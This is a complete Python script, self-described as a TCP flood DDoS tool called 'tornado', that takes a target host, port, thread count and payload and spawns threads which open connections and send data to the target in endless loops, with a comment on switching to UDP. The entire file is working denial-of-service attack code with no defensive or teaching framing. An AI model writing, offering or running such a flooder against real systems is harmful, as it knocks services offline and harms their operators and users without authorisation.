#!/usr/bin/env python3

# A brief implementation of a TCP Flood dDOS attack

import sys
import socket
import threading

if len(sys.argv) <= 5:
    print("usage: tornado <target> <port> <threads> <times> <payload>")
    sys.exit(0)

host = sys.argv[1]
port = int(sys.argv[2])
threads = int(sys.argv[3])
times = int(sys.argv[4])
data = bytes(sys.argv[5].encode('utf-8'))

def main():
    print(f"TORNADO TCP-FLOOD\n=================\nhost: {host}\nport: {port}\nthreads: {threads}\ntimes: {times}")
    for i in range(threads + 1):
        print(f"creating socket : {i}", end='\r')
        th = threading.Thread(target = run)
        th.start()
    print()

def run():
    while True:
        try: 
            # change to socket.SOCK_DGRAM for UDP
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.send(data)
            # optional
            for i in range(times):
                s.send(data)
                # print(f"sent {data} : {i}")
        except Exception as err:
            print(f"error: could not connect to remote host: {err}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("exiting...")
        sys.exit(0)

